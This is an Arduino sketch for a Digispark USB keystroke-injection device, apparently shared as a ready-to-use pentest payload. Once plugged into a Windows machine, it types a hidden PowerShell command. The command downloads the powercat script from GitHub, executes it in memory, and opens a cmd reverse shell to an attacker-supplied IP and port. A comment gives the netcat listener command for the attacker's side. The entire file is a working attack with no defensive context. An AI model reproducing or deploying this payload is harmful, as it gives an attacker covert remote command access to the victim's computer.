//Execute a netcat/powercat reverse shell by downloading powercat on the windows system and giving attacker a reverse shell
// on attacker machine write nc -lnvp 4444
// Created by: Pentestersploit/Adrilaw https://github.com/Adrilaw
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("PowerShell.exe -WindowStyle Hidden -Command \"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c YOUR_IP -p YOUR_PORT -e cmd\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}

void loop() {}
